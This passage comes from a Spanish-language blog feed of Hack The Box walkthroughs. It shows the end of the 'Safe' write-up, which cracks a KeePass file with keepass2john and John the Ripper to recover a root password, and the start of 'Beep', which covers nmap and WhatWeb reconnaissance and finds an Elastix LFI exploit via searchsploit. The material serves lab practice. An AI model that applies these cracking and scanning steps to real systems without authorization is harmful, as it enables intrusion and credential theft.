&lt;p&gt;Una vez tengamos tanto las imágenes como el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt; en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esteganografía&lt;/code&gt;, ya que si abrimos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepassxc&lt;/code&gt;, nos pregunta por un archivo clave.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/34.png&quot; alt=&quot;34&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En caso de no contar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepassxc&lt;/code&gt; instalado, podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install keepassxc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt;, no obstante, primero tendremos que pasar de formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KeePass&lt;/code&gt;, a formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;, para crackear la contraseña haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt;, de modo que usaremos  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt;, mediante el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-k&lt;/code&gt;. Esto se vería algo así:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;keepass2john &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &amp;lt;imagenDeseada&amp;gt; MyPasswords.kdbx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un &lt;em&gt;bucle for&lt;/em&gt;, para ir iterando sobre cada imagen.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;image &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;keepass2john &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt; MyPasswords.kdbx&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/35.png&quot; alt=&quot;35&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue &lt;em&gt;MyPasswords&lt;/em&gt;, lo cual no nos es de ayuda, por lo que podemos reemplazar &lt;em&gt;MyPasswords&lt;/em&gt;, por el nombre de la imagen.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;image &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;keepass2john &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt; MyPasswords.kdbx | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/MyPasswords/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; nombreArchivo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/36.png&quot; alt=&quot;36&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente, para crackear la contraseña, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; en conjunto del diccionario &lt;a href=&quot;https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20220209T031834Z&amp;amp;X-Amz-Expires=300&amp;amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;amp;X-Amz-SignedHeaders=host&amp;amp;actor_id=79855501&amp;amp;key_id=0&amp;amp;repo_id=97553311&amp;amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;amp;response-content-type=application%2Foctet-stream&quot;&gt;rockyou.txt&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install john
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo john --wordlist=/ruta/del/diccionario/rockyou.txt nombreArchivo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/37.png&quot; alt=&quot;37&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/38.png&quot; alt=&quot;38&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/39.png&quot; alt=&quot;39&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/40.png&quot; alt=&quot;40&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 27 Dec 2021 00:00:00 -0500</pubDate>
        <link>/es/Safe-Hack-The-Box/</link>
        <guid isPermaLink="true">/es/Safe-Hack-The-Box/</guid>
      </item>
    
      <item>
        <title>Beep - Hack The Box</title>
        <description>&lt;p&gt;En esta ocasión vamos a resolver la máquina &lt;em&gt;Beep&lt;/em&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;. Es una máquina &lt;em&gt;Linux&lt;/em&gt; de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/1.png&quot; alt=&quot;User Rated Difficulty&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta máquina nos permite realizar, tanto la intrusión, como la escalada de privilegios, de distintas maneras, por lo que es genial para aprender algunas técnicas de explotación, las cuales vamos a cubrir.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;

&lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Linux&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Sistema Operativo (OS)&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.7 -R                               
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Basándonos en la información que nos reporta &lt;em&gt;Nmap&lt;/em&gt;, podemos darnos cuenta que la máquina víctima tiene abiertos algunos puertos relacionados con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Debido a que la máquina cuenta con estos puertos abiertos, podríamos intentar aplicar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fuzzing&lt;/code&gt;, no obstante, no vamos a encontrar nada interesante.&lt;/p&gt;

&lt;p&gt;Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb https://10.10.10.7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb https://10.10.10.7:10000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos observar, no hay nada especialmente relevante, a excepción de ese error relacionado con &lt;em&gt;SSL&lt;/em&gt; que aparece cuando visitamos la página a través del protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt;, el cual no es nada grave, y de hecho lo veremos en un momento.&lt;/p&gt;

&lt;p&gt;En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que al abrir la primera página desde nuestro navegador (y por consiguiente la segunda, pues se está aplicando un redirect como pudimos ver en lo reportado por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;), nos salta un aviso de que la conexión no es segura, y esto se debe a que el &lt;em&gt;certificado SSL&lt;/em&gt; que se está empleando, es autofirmado, por lo que se lo considera inseguro. En esta ocasión, y como sabemos que la página web pertenece a &lt;em&gt;HackTheBox&lt;/em&gt;, haremos caso omiso a la advertencia y procederemos a la página web.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo primero que llama nuestra atención es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elastix&lt;/code&gt;, el cual es un software encargado de unificar servicios PBX IP, correo electrónico, mensajería instantánea, fax entre otros, el cual va bastante de la mano con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Asterisk&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Respecto a la tercera página web, el navegador nuevamente nos avisará del &lt;em&gt;certificado SSL&lt;/em&gt; autofirmado, aviso, el cual una vez más obviaremos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez dentro, lo primero que vemos es un panel que nos pide autenticar para tener acceso a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Webmin&lt;/code&gt;, una herramienta que permite la administración de servicios basados en &lt;em&gt;Unix&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;

&lt;p&gt;Como mencioné en un inicio, la máquina &lt;em&gt;Beep&lt;/em&gt; cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación---local-file-inclusion&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación - Local File Inclusion&lt;/h3&gt;

&lt;p&gt;Lo primero que se nos puede ocurrir a la hora de encontrar un panel de login, sería probar contraseñas por defecto (un error bastante común aún hoy en día). Sin embargo, ninguna de las &lt;a href=&quot;https://www.elastix.org/community/threads/default-passwords-not-password.8416/&quot;&gt;siguientes&lt;/a&gt; credenciales nos es de ayuda para logearnos en el servicio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elastix&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;La siguiente idea que podemos probar, sería buscar algún tipo de &lt;em&gt;exploit&lt;/em&gt; para el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elastix&lt;/code&gt;; para ello utilizaremos &lt;em&gt;SearchSploit&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit Elastix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este caso &lt;em&gt;SearchSploit&lt;/em&gt; nos muestra algunos &lt;em&gt;exploits&lt;/em&gt; interesantes, sin embargo, nos vamos a quedar con el que nos permite realizar un &lt;a href=&quot;https://mateonitro550.github.io/Local-File-Inclusion-(LFI)&quot;&gt;&lt;em&gt;Local File Inclusion (LFI)&lt;/em&gt;&lt;/a&gt;, vulnerabilidad que ya revisamos.&lt;/p&gt;

&lt;p&gt;En este caso no nos haría falta descargar el &lt;em&gt;exploit&lt;/em&gt;, ya que lo más probable es que nos indique en que ruta podemos aplicar el &lt;em&gt;LFI&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit -x php/webapps/37637.pl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

